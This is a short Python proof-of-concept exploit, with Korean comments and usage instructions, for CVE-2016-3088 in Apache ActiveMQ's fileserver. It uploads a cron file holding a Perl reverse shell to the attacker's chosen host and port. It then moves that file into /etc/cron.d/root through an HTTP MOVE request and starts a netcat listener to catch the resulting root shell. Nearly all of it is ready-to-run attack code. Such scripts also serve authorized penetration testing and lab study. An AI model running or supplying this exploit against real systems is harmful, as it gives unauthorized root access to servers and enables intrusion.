# 제작자: Roronoa
# netcat 설치 필수!
# 사용법: python POC.py -url 상대방 주소 -lhost 내 ip주소 -lport 리스닝할 포트
# 명령어 실행 예: python POC.py -url http://192.168.60.132:8161 -lhost 192.168.45.249 -lport 9999

import requests
import argparse
from urllib.parse import urljoin
import subprocess

parser = argparse.ArgumentParser(description='CVE-2016-3088(ActiveMQ) POC')
parser.add_argument('-url', required=True, help='url')
parser.add_argument('-lhost', required=True, help='lhost')
parser.add_argument('-lport', required=True, help='lport')


def file_create(url, lhost, lport):
    data= f"""*/1 * * * * root /usr/bin/perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
    """
    url = urljoin(url, "fileserver/1.txt")
    
    response = requests.put(url, data=data)

    if response.status_code == 204:
        print("[+] PUT 요청 성공!")
    else:
        print(f"[-] 오류: {response.status_code} - {response.text}")

def file_move(url):
    destination_url = 'file:///etc/cron.d/root'
    headers = {'Destination': destination_url}
    url = urljoin(url, "fileserver/1.txt")

    response = requests.request('MOVE', url, headers=headers)

    if response.status_code == 204:
        print("[+] MOVE 요청 성공!")
    else:
        print(f"[-] 오류: {response.status_code} - {response.text}")

if __name__ == "__main__":
    args = parser.parse_args()
    file_create(args.url, args.lhost, args.lport)
    file_move(args.url)
    command = f"nc -lvnp {args.lport}"
    subprocess.call(command, shell=True)